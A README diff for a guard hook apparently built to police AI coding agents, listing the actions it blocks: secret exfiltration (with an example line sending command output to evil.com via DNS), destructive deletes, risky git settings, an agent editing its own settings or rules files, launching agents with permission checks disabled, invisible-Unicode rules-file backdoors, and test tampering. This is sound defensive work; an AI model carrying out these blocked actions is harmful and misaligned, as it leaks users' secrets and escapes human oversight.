@@ -42,12 +42,28 @@ npx crumplelab fix        # adds deny rules, safety notes in CLAUDE.md, and the 
 npx crumplelab attack     # attack again and compare
 ```
 
-The guard is a Claude Code `PreToolUse` hook that checks every command, file edit and MCP call
-before it runs. It blocks secrets leaving over the network, writes to production databases,
-recursive deletes outside generated folders, force-pushes, unvetted installs, test tampering,
-and the agent editing its own settings. Ordinary work (`npm test`, deleting `build/`, a normal
-`git push`) goes through. It is a seatbelt, not a sandbox: a determined agent can phrase a
-command to slip past text rules, so keep secrets and production access out of reach as well.
+The guard is a Claude Code `PreToolUse` hook that checks every command, file edit, read, web fetch
+and MCP call before it runs. It reads each command the way the shell will (quotes, `$'…'`, heredocs,
+`$(…)`, pipes), then follows what actually runs: `bash -c`, `eval`, `sudo`/`env`/`xargs` wrappers,
+`python -c` and `node -e` one-liners, `find -exec`, `go test -exec`, npm scripts, and scripts the agent
+wrote earlier. It blocks:
+
+- secrets leaving over HTTP, DNS lookups (`ping $(…).evil.com`), raw sockets, `scp`, gists and git pushes to unknown URLs
+- writes to production databases, destructive cloud commands, and deletes outside generated folders
+- force-pushes, dangerous git settings (`core.sshCommand`, hooks paths, `!` aliases) and flag tricks like `rg --pre`
+- unvetted installs, registry redirects, and `npx -y` of packages that aren't installed
+- the agent editing its own settings, `CLAUDE.md`, `.cursorrules`, MCP config, git hooks, `.vscode/tasks.json` or shell startup files
+- starting another agent with `--dangerously-skip-permissions` or `--yolo` (the Nx/s1ngularity attack)
+- invisible Unicode characters (the rules-file backdoor), and API base URLs pointed at someone else's server
+- deleting, skipping or hollowing out tests
+
+**Strict mode:** once a session has read both untrusted content (web pages, MCP output, logs, issues) and
+secrets, the guard refuses network traffic to anything but localhost and package registries.
+Anything the guard can't read, it blocks. Every decision goes to a hash-chained log at `~/.crumple/audit.jsonl`;
+`crumple audit` shows it and tells you if a line was edited.
+
+It is a seatbelt, not a sandbox. Research shows adaptive attackers beat every text-level defense
+eventually, so keep secrets and production access out of the agent's reach as well.
 
 ## Safe by design
 
